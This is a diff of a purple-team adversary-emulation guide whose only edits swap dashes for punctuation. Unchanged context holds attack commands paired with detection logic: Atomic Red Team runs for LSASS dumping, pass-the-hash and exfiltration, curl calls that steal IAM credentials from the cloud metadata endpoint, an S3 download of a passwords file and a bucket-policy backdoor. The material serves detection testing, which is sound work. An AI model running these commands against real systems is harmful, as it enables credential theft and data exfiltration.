@@ -302,7 +302,7 @@ Invoke-AtomicTest T1059.001 -TestNumbers 1 -InputArgs @{command="whoami"}
 # Run cleanup after test
 Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
 
-# Execute ALL atomics (full coverage run — use on dedicated test system)
+# Execute ALL atomics (full coverage run: use on dedicated test system)
 Invoke-AtomicTest All
 
 # Execute all with prerequisites auto-installed
@@ -609,12 +609,12 @@ Before executing any test, document:
 ```markdown
 ## Detection Hypothesis: T1558.003 Kerberoasting
 
-**Technique:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
+**Technique:** T1558.003, Steal or Forge Kerberos Tickets: Kerberoasting
 **Test:** Invoke-AtomicTest T1558.003 -TestNumbers 1
 
 **Expected detection:**
 - Tool: Splunk (Security SIEM)
-- Alert name: "Possible Kerberoasting — RC4 TGS Request"
+- Alert name: "Possible Kerberoasting, RC4 TGS Request"
 - Detection logic: Event ID 4769 with TicketEncryptionType = 0x17 (RC4) and
   TicketOptions = 0x40810000 from a non-service account
 - SLA: Alert within 10 minutes of execution
@@ -790,37 +790,37 @@ SCENARIO: APT29-Inspired Credential Access Campaign
 OBJECTIVE: Validate detection of Russian SVR-style credential theft following
            phishing-based initial access
 
-THREAT ACTOR: APT29 (Cozy Bear) — Russian SVR, active against government,
+THREAT ACTOR: APT29 (Cozy Bear), Russian SVR, active against government,
               think tanks, healthcare, and tech sectors
 
-PHASE 1 — INITIAL ACCESS
+PHASE 1: INITIAL ACCESS
   Technique: T1566.001 Spearphishing Attachment
   Simulation: Deliver weaponized Office document to test mailbox
   Atomic: Manual delivery to sandboxed endpoint
   Detection expected: Email gateway block + EDR macro alert
 
-PHASE 2 — EXECUTION
+PHASE 2: EXECUTION
   Technique: T1059.001 PowerShell
   Simulation: PowerShell download cradle from C2 simulation server
   Atomic: Invoke-AtomicTest T1059.001 -TestNumbers 2
   Detection expected: PowerShell Script Block Logging Event 4104
 
-PHASE 3 — PERSISTENCE
+PHASE 3: PERSISTENCE
   Technique: T1547.001 Registry Run Key
   Atomic: Invoke-AtomicTest T1547.001 -TestNumbers 1
   Detection expected: Sysmon Event 13 registry value set
 
-PHASE 4 — CREDENTIAL ACCESS
+PHASE 4: CREDENTIAL ACCESS
   Technique: T1003.001 LSASS Memory
   Atomic: Invoke-AtomicTest T1003.001 -TestNumbers 1
   Detection expected: Sysmon Event 10 LSASS access + EDR alert
 
-PHASE 5 — LATERAL MOVEMENT
+PHASE 5: LATERAL MOVEMENT
   Technique: T1550.002 Pass the Hash
   Atomic: Invoke-AtomicTest T1550.002 -TestNumbers 1
   Detection expected: Event 4624 (Logon Type 3, NTLM) + Event 4648
 
-PHASE 6 — COLLECTION / EXFILTRATION
+PHASE 6: COLLECTION / EXFILTRATION
   Technique: T1074.001 Local Data Staging + T1048 Exfiltration Alt Protocol
   Atomic: Invoke-AtomicTest T1074.001; Invoke-AtomicTest T1048
   Detection expected: Large file creation + outbound DNS/ICMP anomaly
@@ -861,7 +861,7 @@ Hierarchy structure:
 ```
 Organization
   └── Project (e.g., "FY2025 Purple Team Program")
-        └── Campaign (e.g., "Q1 2025 — APT29 Emulation")
+        └── Campaign (e.g., "Q1 2025: APT29 Emulation")
               └── Assessment (e.g., "Credential Access Techniques")
                     └── Test Cases (individual ATT&CK technique tests)
 ```
@@ -1001,7 +1001,7 @@ jobs:
   atomic-validation:
     runs-on: [self-hosted, purple-team-endpoint]
     steps:
-      - name: Run Atomic Tests — Credential Access
+      - name: Run Atomic Tests, Credential Access
         shell: powershell
         run: |
           Import-Module invoke-atomicredteam
@@ -1068,7 +1068,7 @@ $spns | ForEach-Object {
 Detection (Windows Security Event 4769):
 ```
 EventID: 4769 (A Kerberos service ticket was requested)
-TicketEncryptionType: 0x17 (RC4 — weak, crackable offline)
+TicketEncryptionType: 0x17 (RC4, weak, crackable offline)
 TicketOptions: 0x40810000
 ServiceName: NOT ending in $ (user account, not computer account)
 ```
@@ -1273,7 +1273,7 @@ index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com
 
 Attack (steal instance credentials from IMDS):
 ```bash
-# IMDSv1 (no authentication required — vulnerable)
+# IMDSv1 (no authentication required: vulnerable)
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
 
@@ -1298,7 +1298,7 @@ aws s3 ls s3://corp-sensitive-bucket/ --recursive
 # Download sensitive files
 aws s3 cp s3://corp-sensitive-bucket/passwords.xlsx ./
 
-# Stratus Red Team — backdoor bucket policy for exfiltration
+# Stratus Red Team: backdoor bucket policy for exfiltration
 stratus-red-team detonate aws.exfiltration.s3-backdoor-bucket-policy
 ```
 
